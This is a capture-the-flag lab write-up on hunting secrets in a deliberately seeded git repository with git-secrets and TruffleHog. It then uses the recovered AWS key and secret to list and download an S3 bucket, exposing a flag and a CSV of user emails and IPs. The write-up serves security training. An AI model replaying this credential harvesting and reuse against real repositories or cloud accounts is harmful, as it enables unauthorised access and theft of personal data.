# Hunt for Secrets in Git Repos

In this lab we will working with both TruffleHog and git-secrets to find secrets for our engagements.

We are first going to clone our target repo for this lab. We can do so with the command:
```
git clone https://github.com/huge-logistics/cargo-logistics-dev .
```
_Also, I performed this in its own directory just to keep things neat._

Let's take a look at the index.html file we just got. Let's open it up with our browser.

Now for this lab there are 2 ways of going ahead and scanning for secrets. _git-secrets & TruffleHog_. First we will go about using git-secrets to scan this site's repo then trufflehog.

## Git-Secrets

### Installing git-secrets

To install git secrets, create a folder you would want to clone the tool into. after dong so you can run the following commands for installation:
```
git clone https://github.com/awslabs/git-secrets
cd git-secrets
make install
```

### Using git-secrets

Now that we have git-secrets, we can enable it for a specific directory. We will do so to the directory we cloned the target repo in.
```
┌─[pwnedlabs@cloud]─[~/labs/huntsecrets]
└──╼ $ git secrets --install                           
✓ Installed commit-msg hook to .git/hooks/commit-msg
✓ Installed pre-commit hook to .git/hooks/pre-commit
✓ Installed prepare-commit-msg hook to .git/hooks/prepare-commit-msg

┌─[pwnedlabs@cloud]─[~/labs/huntsecrets]
└──╼ $ git secrets --register-aws
OK
```

With this setup now, we can run a quick scan to see if there are secrets currently present.
```
git secrets --scan
```

We got nothing from that scan, so let's do an a historical scan to see if they were available in the past.
```
git secrets --scan-history
d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php:10:	    'key'    => "AKIAWHEOTHRFSGQITLIY",

[ERROR] Matched one or more prohibited patterns

Possible mitigations:
- Mark false positives as allowed using: git config --add secrets.allowed ...
- Mark false positives as allowed by adding regular expressions to .gitallowed at repository's root directory
- List your configured patterns: git config --get-all secrets.patterns
- List your configured allowed patterns: git config --get-all secrets.allowed
- List your configured allowed patterns in .gitallowed at repository's root directory
- Use --no-verify if this is a one-time false positive
```

We were able to find an AWS Access Key in the _log-upload.php_ from a prior commit. 
```
git show d8098af5fbf1aa35ae22e99b9493ffae5d97d58f:log-s3-test/log-upload.php
<?php

// Include the SDK using the composer autoloader
require 'vendor/autoload.php';

$s3 = new Aws\S3\S3Client([
        'region'  => 'us-east-1',
        'version' => 'latest',
        'credentials' => [
            'key'    => "AKIAWHEOTHRFSGQITLIY",
            'secret' => "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",
        ]
]);

// Send a PutObject request and get the result object.
$key = 'transact.log';

$result = $s3->putObject([
        'Bucket' => 'huge-logistics-transact',
        'Key'    => $key,
        'SourceFile' => 'transact.log'
]);

// Print the body of the result by indexing into the result object.
var_dump($result);

?>
```

_Now if you wanted to take this access key and secret and progress onto the flag portion of the lab, feel free. If not, follow me as we learn about TruffleHog_

_Fun fact about me, my boss made TruffleHog lol_

## TruffleHog

Trufflehog is another peak tool for automating secrets discovery. Now in this lab there are 2 versions of Trufflehog, Python (old) and Go (new) version.

_Fun fact about me, my boss made TruffleHog lol_

_Also you may have noticed I am using PwnCloudOS, this natively has the python version of trufflehog setup, in this lab you can access it with the the trufflehog command but wiht the new trufflehog you will have to follow the setup_

### Old TruffleHog (Python-based)

Old TruffleHog focuses on detecting secrets using **regex patterns and entropy analysis**. It's for simple use cases like CTFs because it does not understand cloud providers and cannot validate whether a discovered secret is actually active.

Let's run a scan with TruffleHog to see if we can find any secrets
```
trufflehog --regex --entropy=False ~/labs/huntsecrets/
~~~~~~~~~~~~~~~~~~~~~
Reason: AWS API Key
Date: 2023-07-05 17:46:16
Hash: ea1a7618508b8b0d4c7362b4044f1c8419a07d99
Filepath: log-s3-test/log-upload.php
Branch: origin/main
Commit: Delete log-s3-test directory
AKIAWHEOTHRFSGQITLIY
~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~
Reason: Generic Secret
Date: 2023-07-05 17:46:16
Hash: ea1a7618508b8b0d4c7362b4044f1c8419a07d99
Filepath: log-s3-test/log-upload.php
Branch: origin/main
Commit: Delete log-s3-test directory
secret' => "IqHCweAXZOi8WJlQrhuQulSuGnUO51HFgy7ZShoB"
~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~
Reason: AWS API Key
Date: 2023-07-04 18:49:13
Hash: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Filepath: log-s3-test/log-upload.php
Branch: origin/main
Commit: Initial Commit
AKIAWHEOTHRFSGQITLIY
~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~
Reason: Generic Secret
Date: 2023-07-04 18:49:13
Hash: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Filepath: log-s3-test/log-upload.php
Branch: origin/main
Commit: Initial Commit
secret' => "IqHCweAXZOi8WJlQrhuQulSuGnUO51HFgy7ZShoB"
~~~~~~~~~~~~~~~~~~~~~
```

_There was a lot of noise that I removed from this output, you will find your gold at the top of this output_

And if you wanted to scan the repository URL instead of downloading and scanning it locally, you can do so with the command:

```
trufflehog https://github.com/huge-logistics/cargo-logistics-dev --max-depth 2
```

### New TruffleHog (Go-based)

New TruffleHog is a more advanced tool designed for real-world security workflows. It uses **provider-aware detectors** (such as AWS, and GitHub), supports **secrets validation**, and it introduces subcommands like _git_ and _github_. This version is also more commonly used in CI/CD pipelines.

Now with this version, I had to install it and was a bit confused but here are the commands that worked for me.

Create a directory you want to have the tool in. Then run the commands:
```
git clone https://github.com/trufflesecurity/trufflehog/; cd trufflehog
go build
```

_Heads up, the go build command may take a minute and you may think its frozen, its not it just takes a min_

Now you can scan a local repository running the command shown below. I used the path that I saw from the browser when initially looking at index.html
```
~/labs/trufflehogfolder/trufflehog/trufflehog git file:///home/pwnedlabs/labs/huntsecrets/ --regex --no-entropy
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2025-12-27T01:09:58Z	info-0	trufflehog	running source	{"source_manager_worker_id": "LSaKY", "with_units": true}
2025-12-27T01:09:58Z	info-0	trufflehog	scanning repo	{"source_manager_worker_id": "LSaKY", "unit_kind": "dir", "unit": "/tmp/trufflehog-74761-539333182", "repo": "file:///home/pwnedlabs/labs/huntsecrets"}
✅ Found verified result 🐷🔑
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAWHEOTHRFSGQITLIY
Resource_type: Access key
Account: 427648302155
User_id: AIDAWHEOTHRF24EMR3SXJ
Arn: arn:aws:iam::427648302155:user/dev-test
Rotation_guide: https://howtorotate.com/docs/tutorials/aws/
Commit: 5ea567e3f51523b2168aac58b3a1fe634e5610a0
Email: Ian Austin <iandaustin@outlook.com>
File: Backend/.zip
Line: 10
Repository: file:///home/pwnedlabs/labs/huntsecrets
Repository_local_path: /tmp/trufflehog-74761-539333182
Timestamp: 2023-07-05 14:10:11 +0000

✅ Found verified result 🐷🔑
(Verification info cached)
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAWHEOTHRFSGQITLIY
Resource_type: Access key
Account: 427648302155
Commit: 5ea567e3f51523b2168aac58b3a1fe634e5610a0
Email: Ian Austin <iandaustin@outlook.com>
File: backend.zip
Line: 10
Repository: file:///home/pwnedlabs/labs/huntsecrets
Repository_local_path: /tmp/trufflehog-74761-539333182
Timestamp: 2023-07-05 14:10:11 +0000

✅ Found verified result 🐷🔑
(Verification info cached)
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAWHEOTHRFSGQITLIY
Resource_type: Access key
Account: 427648302155
Commit: d8098af5fbf1aa35ae22e99b9493ffae5d97d58f
Email: Ian Austin <iandaustin@outlook.com>
File: log-s3-test/log-upload.php
Line: 10
Repository: file:///home/pwnedlabs/labs/huntsecrets
Repository_local_path: /tmp/trufflehog-74761-539333182
Timestamp: 2023-07-04 17:49:13 +0000

2025-12-27T01:10:02Z	info-0	trufflehog	finished scanning	{"chunks": 6114, "bytes": 48593040, "verified_secrets": 3, "unverified_secrets": 0, "scan_duration": "5.318160436s", "trufflehog_version": "dev", "verification_caching": {"Hits":10,"Misses":5,"HitsWasted":0,"AttemptsSaved":10,"VerificationTimeSpentMS":2351}}
```

To scan the URL instead of a local directory, run this command:
```
~/labs/trufflehogfolder/trufflehog/trufflehog git https://github.com/huge-logistics/cargo-logistics-dev --max_depth 2 
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

2025-12-27T01:12:32Z	info-0	trufflehog	running source	{"source_manager_worker_id": "QCahM", "with_units": true}
2025-12-27T01:12:32Z	info-0	trufflehog	scanning repo	{"source_manager_worker_id": "QCahM", "unit_kind": "dir", "unit": "/tmp/trufflehog-75024-905988387", "repo": "https://github.com/huge-logistics/cargo-logistics-dev", "max_depth": 2}
✅ Found verified result 🐷🔑
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAWHEOTHRFSGQITLIY
Resource_type: Access key
Account: 427648302155
Rotation_guide: https://howtorotate.com/docs/tutorials/aws/
User_id: AIDAWHEOTHRF24EMR3SXJ
Arn: arn:aws:iam::427648302155:user/dev-test
Commit: 5ea567e3f51523b2168aac58b3a1fe634e5610a0
Email: Ian Austin <iandaustin@outlook.com>
File: Backend/.zip
Line: 10
Repository: https://github.com/huge-logistics/cargo-logistics-dev
Repository_local_path: /tmp/trufflehog-75024-905988387
Timestamp: 2023-07-05 14:10:11 +0000

2025-12-27T01:12:33Z	info-0	trufflehog	finished scanning	{"chunks": 2165, "bytes": 17643640, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "4.176682049s", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":5,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":1055}}
```

## Grabbing the flag!

Now we can run this manual scan to see if anyone connected with MySQLi.
```
grep -R "mysqli_connect" . 2> /dev/null
./Backend/include/DB.php:$Connection = mysqli_connect("localhost","root","hug3l0gistics11","");
./status.php://$Connection = mysqli_connect('localhost','theunite_neeraj', '',) or die("No Connection"); \
```

These confirm our findings from before and we can utilize the secrets we found from our scans. Let sign in and assume this user.

```
aws configure

aws sts get-caller-identity
{
    "UserId": "AIDAWHEOTHRF24EMR3SXJ",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/dev-test"
}
```

Now that we are this user, let's try looking at the bucket of the site and see what's available to us.
```
aws s3 ls s3://huge-logistics-transact                        
2023-07-05 15:53:50         32 flag.txt
2023-07-04 17:15:47          5 transact.log
2023-07-05 15:57:36      51968 web_transactions.csv

aws s3 cp s3://huge-logistics-transact . --recursive
download: s3://huge-logistics-transact/transact.log to ./transact.log
download: s3://huge-logistics-transact/flag.txt to ./flag.txt     
download: s3://huge-logistics-transact/web_transactions.csv to ./web_transactions.csv
```

We now have downloaded logs, a web transaction file, and the flag. When looking at the _web_transactions.csv_ file, we see some personal information which is definitely not good.

```
cat web_transactions.csv
id,username,email,ip_address
1,aemblen0,csautter0@soup.io,196.54.202.51
2,jpiff1,rgovett1@cafepress.com,59.222.23.53
3,aharbour2,bgilfether2@seattletimes.com,178.60.232.230
4,clomis3,rhardwich3@alibaba.com,165.58.39.76
5,cmalthus4,morrobin4@omniture.com,164.101.115.130
6,rnussii5,bembury5@reference.com,235.243.126.82
7,tstquintin6,ddelmage6@japanpost.jp,106.79.209.13
8,areuben7,mbeadham7@csmonitor.com,254.118.21.81
9,kbegley8,jbuff8@nytimes.com,4.163.136.96
10,hellerington9,sferreli9@naver.com,127.116.67.79
11,emclemona,descha@theatlantic.com,195.31.238.74
12,sorganb,kseylerb@time.com,114.116.249.243
13,elesaunierc,ghearnec@census.gov,165.45.183.247
14,rrottgerd,imcalroyd@bandcamp.com,199.87.167.214
15,ocartmere,mmatouseke@godaddy.com,108.128.246.109
16,lmellowsf,adaddowf@surveymonkey.com,51.251.25.185
17,emccartg,mbeardallg@amazon.de,225.180.93.68
18,mfynanh,dbaylyh@jugem.jp,244.89.147.5
19,npentonyi,jtokelli@yellowbook.com,218.150.71.9
20,pjimesj,fboshellj@upenn.edu,45.176.116.15
```

Now we can end our lab by taking a peek inside of _flag.txt_
```
cat flag.txt     
fe108d6a1a0937b0a7620947a678aabf%  
```
